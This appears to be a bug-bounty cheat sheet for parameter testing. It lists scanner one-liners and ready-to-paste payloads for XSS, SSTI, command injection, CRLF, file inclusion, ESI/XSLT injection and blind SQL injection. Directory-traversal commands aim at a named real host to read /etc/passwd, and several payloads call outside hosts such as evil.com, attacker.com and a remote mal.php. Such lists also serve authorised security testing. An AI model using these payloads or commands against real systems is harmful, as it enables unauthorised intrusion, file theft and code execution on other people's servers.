# Parameters Manual Testing

#### Automation

```bash
# Paramspider | gau | kxss
python3 ParamSpider/paramspider.py -d target | kxss 
cat subdomains.txt | gau | grep "?" | kxss

# parameter brute forcing 
Arjun -u host.com -w Wordlists/Param-Miner.txt

# Dalfox tool for scanning
Dalfox url host.com?parameters=xss

# Nuclei to fuzz for vulns
nuclei -l parameters.txt -t nuclei_templates/ -et nuclei_templates/waf -et nuclei_templates/others

# DotDotPwn --> <https://github.com/wireghoul/dotdotpwn>  --> for Directory Traversal automation
dotdotpwn -m http-url -u "<https://attachrite.dell.com/en/images/TRAVERSAL>" -f "/???/??ss??" -k "root" -d 20 -b -e "%00.png"
dotdotpwn -m http-url -u "<https://attachrite.dell.com/en/images/TRAVERSAL>" -f "etc/passwd" -k "root" -d 20 -b
```

#### Manual Testing (Credit: HackTricks)

*   **XSS**&#x20;

    ```python
    <img src=x onerror=alert("XSS_By_h0tak88r")> 
    <00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/ 
    jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
    ```
*   **Open Redirect** → **SSRF**

    {% code overflow="wrap" %}
    ```python
    www.whitelisted.com
    www.whitelisted.com.evil.com
    <https://google.com>
    //google.com
    javascript:alert(1)
    <https://evil.com>
    <https://hackerone.com/reports/59372> -> Homograph Attack
    ```
    {% endcode %}
*   **CSTI**&#x20;

    ```
    {{7*7}}[7*7]→ {{3*3}}
    {{constructor.constructor('alert(document.cookie)')()}}
    ```
* **SSTI** → `{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}${{<%[%'"}}%\\` → **RCE**
*   **Command Injection →**

    ```python
    1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
    /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
    ```
*   **CRLF →**

    ```jsx
    %0d%0aLocation:%20http://attacker.com

    %3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

    %3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E

    %0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
    ```
* **Dangled Markup \[ HTML Injection ] →** `<br>lol<b><h1>THIS IS AND INJECTED TITLE </h1>`
*   **Local File Inclusion**&#x20;

    ```jsx
    /etc/passwd
    ../../../../../../etc/hosts
    ..\\..\\..\\..\\..\\..\\etc/hosts
    /etc/hostname
    ../../../../../../etc/hosts
    C:/windows/system32/drivers/etc/hosts
    ../../../../../../windows/system32/drivers/etc/hosts
    ..\\..\\..\\..\\..\\..\\windows/system32/drivers/etc/hosts
    <http://asdasdasdasd.burpcollab.com/mal.php>
    \\\\asdasdasdasd.burpcollab.com/mal.php
    ```
*   **ReDOS**&#x20;

    ```python
    (\\\\w*)+$
    ([a-zA-Z]+)*$
    ((a+)+)+$
    ```
*   **Server Side Inclusion/Edge Side Inclusion**

    ```python
    <!--#echo var="DATE_LOCAL" --><!--#exec cmd="ls" --><esi:include src=http://evil.com/>x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
    ```
*   **XSLT Server Side Injection**

    ```python
    <xsl:value-of select="system-property('xsl:version')" /><esi:include src="<http://10.10.10.10/data/news.xml>" stylesheet="<http://10.10.10.10//news_template.xsl>"></esi:include>
    ```
* **Request smuggling** -> [ATO via request smuggling](https://gist.github.com/h0tak88r/8e6f8ff1f1ec511c57ff2063595f49fb#file-request-smuggling-to-ato)
* SQL Injection

```python
Bug : Blind SQL Injection Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
```
